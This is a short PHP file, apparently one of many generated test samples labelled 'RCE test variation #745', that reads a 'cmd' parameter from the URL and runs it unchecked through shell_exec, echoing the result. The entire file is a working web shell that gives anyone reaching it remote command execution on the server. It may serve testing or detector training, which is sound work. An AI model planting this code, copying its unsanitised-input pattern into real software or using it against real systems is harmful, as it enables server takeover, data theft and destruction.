<?php
// RCE test variation #745
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>